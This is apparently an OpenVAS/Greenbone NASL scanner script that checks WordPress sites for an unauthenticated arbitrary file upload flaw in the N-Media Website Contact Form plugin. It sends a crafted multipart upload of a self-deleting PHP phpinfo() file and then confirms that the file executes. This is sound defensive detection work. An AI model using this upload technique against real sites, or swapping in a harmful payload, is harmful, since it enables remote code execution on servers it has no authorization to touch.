# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805539");
  script_version("2023-07-25T05:05:58+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-04-22 12:54:37 +0530 (Wed, 22 Apr 2015)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("WordPress N-Media Website Contact Form Plugin File Upload Vulnerability");

  script_tag(name:"summary", value:"WordPress N-Media Website Contact Form Plugin is prone to arbitrary file upload vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is able to upload file or not.");

  script_tag(name:"insight", value:"Flaw exists because the 'upload_file' function
  does not properly verify or sanitize user-uploaded files.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unauthenticated remote attacker to upload arbitrary files and execute the
  uploaded script resulting in remote code execution.");

  script_tag(name:"affected", value:"WordPress N-Media Website Contact Form
  Plugin version 1.3.4");

  script_tag(name:"solution", value:"Update to WordPress N-Media Website Contact
  Form Plugin version 1.5 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://wpvulndb.com/vulnerabilities/7896");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/36738");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/131514");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://wordpress.org/plugins/website-contact-form-with-file-upload");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-admin/admin-ajax.php";

useragent = http_get_user_agent();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

vtstrings = get_vt_strings();
fileName = vtstrings["lowercase_rand"];

postData = string('------------------------------9aebb16b1ca1\r\n',
                  'Content-Disposition: form-data; name="action"\r\n\r\n',
                  'upload\r\n',
                  '------------------------------9aebb16b1ca1\r\n',
                  'Content-Disposition: form-data; name="Filedata"; filename="', fileName ,'.php"\r\n',
                  'Content-Type: application/octet-stream', '\r\n\r\n',
                  '<?php phpinfo(); $fileName = glob("*-', fileName, '.php")[0]; unlink($fileName); ?>\r\n\r\n',
                  '------------------------------9aebb16b1ca1\r\n',
                  'Content-Disposition: form-data; name="action"\r\n\r\n',
                  'nm_webcontact_upload_file\r\n',
                  '------------------------------9aebb16b1ca1--');

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Length: ", strlen(postData), "\r\n",
             "Content-Type: multipart/form-data; boundary=----------------------------9aebb16b1ca1\r\n",
             "\r\n", postData);
res = http_keepalive_send_recv(port:port, data:req);

if('status":"uploaded' >< res && res =~ "^HTTP/1\.[01] 200") {

  upFile = eregmatch(pattern: "filename...([0-9]+-" + fileName + ".php)", string: res);
  if(!upFile[1])
    exit(0);

  report = http_report_vuln_url(port:port, url:url);
  url = dir + "/wp-content/uploads/contact_files/" + upFile[1];

  if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:">phpinfo\(\)<", extra_check:">System")) {

    if(http_vuln_check(port:port, url:url, check_header:FALSE, pattern:"^HTTP/1\.[01] 200")) {
      report += '\nUnable to delete the uploaded file at ' + http_report_vuln_url(port:port, url:url, url_only:TRUE) + ". Please delete this file manually.";
    }

    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
